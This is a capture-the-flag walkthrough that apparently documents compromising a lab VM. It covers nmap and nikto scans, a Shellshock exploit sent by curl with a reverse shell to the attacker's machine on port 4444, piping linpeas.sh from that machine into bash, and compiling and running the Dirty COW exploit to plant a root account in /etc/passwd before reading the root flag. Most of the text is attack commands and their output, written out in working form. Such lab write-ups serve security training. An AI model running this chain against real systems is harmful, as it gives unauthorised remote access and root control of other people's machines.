# gooann-192.168.146.51
## NMAP
```
└─$ sudo nmap -A -sV -T4 -p- 192.168.146.51                                                                                                                                                 100 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-18 10:26 HKT
Nmap scan report for 192.168.146.51
Host is up (0.00023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:7B:31:42 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.146.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds

```
##NIKTO
```
└─$ nikto -h 192.168.146.51
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.146.51
+ Target Hostname:    192.168.146.51
+ Target Port:        80
+ Start Time:         2022-07-18 10:27:06 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Tue May 12 01:55:10 2020
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ OSVDB-3092: /cgi-bin/test/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-07-18 10:27:22 (GMT8) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
## Reverse shell
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.146.63/4444 0>&1'"  http://192.168.146.51/cgi-bin/test.sh
```
```
wget http://192.168.146.63/linpeas.sh | bash
╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [4] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131
```
### gcc drow file
```
www-data@ubuntu:/tmp$ locate cc1
locate cc1
/etc/ssl/certs/6fcc125d.0
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1
/usr/share/doc/libgcc1
/usr/share/lintian/overrides/libgcc1
/var/lib/dpkg/info/libgcc1:amd64.list
/var/lib/dpkg/info/libgcc1:amd64.md5sums
/var/lib/dpkg/info/libgcc1:amd64.postinst
/var/lib/dpkg/info/libgcc1:amd64.postrm
/var/lib/dpkg/info/libgcc1:amd64.shlibs
/var/lib/dpkg/info/libgcc1:amd64.symbols
www-data@ubuntu:/tmp$ PATH="$PATH":/usr/lib/gcc/x86_64-linux-gnu/4.6/
PATH="$PATH":/usr/lib/gcc/x86_64-linux-gnu/4.6/
www-data@ubuntu:/tmp$ export PATH
export PATH
www-data@ubuntu:/tmp$ gcc -pthread drow.c -o dirty
gcc -pthread drow.c -o dirty
/tmp/ccRIWErF.o: In function `generate_password_hash':
drow.c:(.text+0x1e): undefined reference to `crypt'
collect2: ld returned 1 exit status
www-data@ubuntu:/tmp$ ls
drow.c
www-data@ubuntu:/tmp$ gcc -pthread drow.c -o dirty -lcrypt
gcc -pthread drow.c -o dirty -lcrypt
www-data@ubuntu:/tmp$ ls
ls
drow.c
www-data@ubuntu:/tmp$ ls -al
ls -al
-rwxr-xr-x  1 www-data www-data 14115 Jul 17 19:18 dirty
-rw-r--r--  1 www-data www-data  4815 Jul 17 01:25 drow.c
www-data@ubuntu:/tmp$ ./dirty
./dirty
Please enter the new password: password

/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7fa1f1bbd000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7fa1f1bbd000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.

```
### Get root flag
```
└─$ ssh firefart@192.168.146.51                                                                                                                                                               1 ⨯
firefart@192.168.146.51's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon May 11 11:47:26 2020
firefart@ubuntu:~# id 
uid=0(firefart) gid=0(root) groups=0(root)
firefart@ubuntu:~# cd /root
firefart@ubuntu:~# ls
root.txt
firefart@ubuntu:~# cat root.txt 
{Sum0-SunCSR-2020_r001}
firefart@ubuntu:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:7b:31:42 brd ff:ff:ff:ff:ff:ff
    inet 192.168.146.51/24 brd 192.168.146.255 scope global eth0
    inet6 fe80::20c:29ff:fe7b:3142/64 scope link 
       valid_lft forever preferred_lft forever
firefart@ubuntu:~# mv /tmp/passwd.bak /etc/passwd
firefart@ubuntu:~# sudo su
root@ubuntu:~# ls
root.txt
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:7b:31:42 brd ff:ff:ff:ff:ff:ff
    inet 192.168.146.51/24 brd 192.168.146.255 scope global eth0
    inet6 fe80::20c:29ff:fe7b:3142/64 scope link 
       valid_lft forever preferred_lft forever
root@ubuntu:~# 

```


